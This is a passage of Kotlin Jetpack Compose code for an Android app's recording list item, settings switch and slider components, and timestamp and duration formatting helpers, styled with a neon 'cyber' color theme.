                    text = formatTimestamp(recording.timestamp),
                    style = MaterialTheme.typography.bodySmall,
                    color = CyberTextSecondary
                )
            }
            
            Spacer(modifier = Modifier.height(8.dp))
            
            Row(
                modifier = Modifier.fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically
            ) {
                // Play button - would be functional in a real implementation
                IconButton(
                    onClick = { /* Play audio */ },
                    modifier = Modifier
                        .size(36.dp)
                        .border(
                            width = 1.dp,
                            color = NeonPink.copy(alpha = 0.5f),
                            shape = RoundedCornerShape(18.dp)
                        )
                        .padding(1.dp)
                        .background(
                            color = CyberDarkSurface,
                            shape = RoundedCornerShape(18.dp)
                        )
                ) {
                    Icon(
                        imageVector = Icons.Default.PlayArrow,
                        contentDescription = "Play",
                        tint = NeonPink,
                        modifier = Modifier.size(20.dp)
                    )
                }
                
                Spacer(modifier = Modifier.width(12.dp))
                
                // Audio waveform visualization (simple representation)
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .height(24.dp)
                        .background(CyberDarkSurface, RoundedCornerShape(4.dp))
                        .border(
                            width = 1.dp,
                            color = NeonPink.copy(alpha = 0.3f),
                            shape = RoundedCornerShape(4.dp)
                        )
                ) {
                    Row(
                        modifier = Modifier
                            .fillMaxSize()
                            .padding(horizontal = 4.dp),
                        horizontalArrangement = Arrangement.SpaceEvenly,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        // Simple audio waveform visualization
                        repeat(20) { i ->
                            val height = (Math.random() * 20).toInt() + 4
                            Box(
                                modifier = Modifier
                                    .width(2.dp)
                                    .height(height.dp)
                                    .background(
                                        color = NeonPink.copy(
                                            alpha = (0.3f + Math.random() * 0.7f).toFloat()
                                        )
                                    )
                            )
                        }
                    }
                }
                
                Spacer(modifier = Modifier.width(12.dp))
                
                // Duration
                Text(
                    text = formatDuration(recording.duration),
                    style = MaterialTheme.typography.bodySmall,
                    color = CyberTextSecondary
                )
            }
        }
    }
}

@Composable
fun SettingsSwitchItem(
    label: String,
    description: String,
    initialValue: Boolean
) {
    var isEnabled by remember { mutableStateOf(initialValue) }
    
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 8.dp),
        verticalAlignment = Alignment.CenterVertically
    ) {
        Column(modifier = Modifier.weight(1f)) {
            Text(
                text = label,
                style = MaterialTheme.typography.bodyLarge,
                color = CyberTextPrimary
            )
            Text(
                text = description,
                style = MaterialTheme.typography.bodySmall,
                color = CyberTextSecondary
            )
        }
        
        Switch(
            checked = isEnabled,
            onCheckedChange = { isEnabled = it },
            colors = SwitchDefaults.colors(
                checkedThumbColor = if (isEnabled) NeonBlue else CyberTextSecondary,
                checkedTrackColor = if (isEnabled) CyberPrimaryDark else CyberDarkBg,
                checkedBorderColor = if (isEnabled) NeonBlue else CyberTextSecondary,
                uncheckedThumbColor = CyberTextSecondary,
                uncheckedTrackColor = CyberDarkBg,
                uncheckedBorderColor = CyberTextSecondary
            )
        )
    }
}

@Composable
fun SettingsSliderItem(
    label: String,
    description: String,
    initialValue: Float,
    range: ClosedFloatingPointRange<Float>,
    steps: Int
) {
    var sliderValue by remember { mutableStateOf(initialValue) }
    
    Column(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 8.dp)
    ) {
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text(
                text = label,
                style = MaterialTheme.typography.bodyLarge,
                color = CyberTextPrimary
            )
            
            Text(
                text = sliderValue.toInt().toString(),
                style = MaterialTheme.typography.bodyMedium,
                color = NeonBlue
            )
        }
        
        Text(
            text = description,
            style = MaterialTheme.typography.bodySmall,
            color = CyberTextSecondary,
            modifier = Modifier.padding(bottom = 8.dp)
        )
        
        Slider(
            value = sliderValue,
            onValueChange = { sliderValue = it },
            valueRange = range,
            steps = steps,
            colors = SliderDefaults.colors(
                thumbColor = NeonBlue,
                activeTrackColor = NeonBlue.copy(alpha = 0.7f),
                inactiveTrackColor = CyberDarkBg,
                activeTickColor = NeonBlue.copy(alpha = 0.5f),
                inactiveTickColor = CyberTextSecondary.copy(alpha = 0.3f)
            )
        )
    }
}

// Utility functions

fun formatTimestamp(timestamp: Long): String {
    val sdf = SimpleDateFormat("MM/dd HH:mm", Locale.getDefault())
    return sdf.format(Date(timestamp))
}

fun formatDuration(durationSec: Int): String {
    val minutes = durationSec / 60
    val seconds = durationSec % 60
    return "$minutes:${seconds.toString().padStart(2, '0')}"
}